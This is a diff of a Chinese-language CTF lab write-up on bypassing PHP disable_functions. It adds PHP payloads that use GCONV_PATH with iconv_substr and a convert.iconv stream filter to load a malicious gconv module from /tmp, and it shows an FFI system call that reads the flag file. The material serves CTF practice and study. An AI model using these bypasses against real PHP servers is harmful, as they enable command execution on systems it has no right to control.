@@ -196,7 +196,7 @@ echo $response;
 >
 > UAF: use after free。
 >
-> 只会用插件的我，直接**使用插件**，然后选择GC UAF，然后直接得到flag。
+> 我自己不会构造EXP，所以我直接**使用插件**，然后选择GC UAF，然后直接得到flag。
 
 ### 1.6 Json Serializer UAF
 
@@ -208,7 +208,7 @@ echo $response;
 
 ### 1.7 Backtrace UAF
 
-> 直接插件吧。
+> 直接插件吧，UAF的exp确实不会构造。
 
 ### 1.8 FFI 扩展
 
@@ -233,8 +233,6 @@ $ffi->system("tac /flag > /var/www/html/flag");
 
 ### 1.9 iconv
 
-> 又是一个看不懂的东西，可以直接用插件。
->
 > [使用GCONV_PATH与iconv进行bypass disable_functions_lesion__的博客-CSDN博客](https://blog.csdn.net/qq_42303523/article/details/117911859)
 
 ```c
@@ -250,6 +248,12 @@ void gconv_init() {
 // gcc -shared -fPIC a.c -o abc.so
 ```
 
+gconv-modules
+```
+module  ABC//    INTERNAL    ../../../../../../../../tmp/abc    2
+module  INTERNAL    ABC//    ../../../../../../../../tmp/abc    2
+```
+
 ```php
 // a.php
 <?php
@@ -258,23 +262,52 @@ void gconv_init() {
 ?>
 ```
 
-gconv-modules
-```
-module  ABC//    INTERNAL    ../../../../../../../../tmp/abc    2
-module  INTERNAL    ABC//    ../../../../../../../../tmp/abc    2
-```
-
 ### 1.10 bypass iconv 1
 
-> 不知道bypass了什么，我自己绕不过去。
->
-> 最终还是用的插件。
+这里iconv函数被过滤了。
+
+![image-20210811105034832](CTFHUB%E8%BF%9B%E9%98%B6.assets/image-20210811105034832.png)
+
+> [php中iconv函数用法详解介绍_PHP教程-php教程-PHP中文网](https://www.php.cn/php-weizijiaocheng-305277.html)
+
+那根据上面的文章，可以换一个函数来使用。
+
+```php
+// a.php
+<?php
+    putenv("GCONV_PATH=/tmp/");
+    iconv_substr("whatever", 1, 1, 'abc');
+?>
+```
 
 ### 1.11 bypass iconv 2
 
-> 不知道bypass了什么，我自己绕不过去。
+![image-20210811110834170](CTFHUB%E8%BF%9B%E9%98%B6.assets/image-20210811110834170.png)
+
+这里iconv几乎所有的函数都被禁用了。
+
+> [探索php://filter在实战当中的奇技淫巧 - linuxsec - 博客园 (cnblogs.com)](https://www.cnblogs.com/linuxsec/articles/12684259.html)
 >
-> 最终还是用的插件。
+> **convert.iconv.***
+>
+> 这个过滤器需要 php 支持 `iconv`，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用[iconv()](https://www.php.net/manual/zh/function.iconv.php)函数处理所有的流数据。
+>
+> 两种使用方法：
+>
+> ```
+> convert.iconv.<input-encoding>.<output-encoding> 
+> convert.iconv.<input-encoding>/<output-encoding>
+> ```
+
+```php
+<?php
+putenv("GCONV_PATH=/tmp/");
+$fp = fopen('php://output', 'w');
+stream_filter_append($fp, 'convert.iconv.abc.utf-8');
+// fwrite($fp, "This is a test.n");
+fclose($fp);
+?>
+```
 
 ## 2. Linux
 
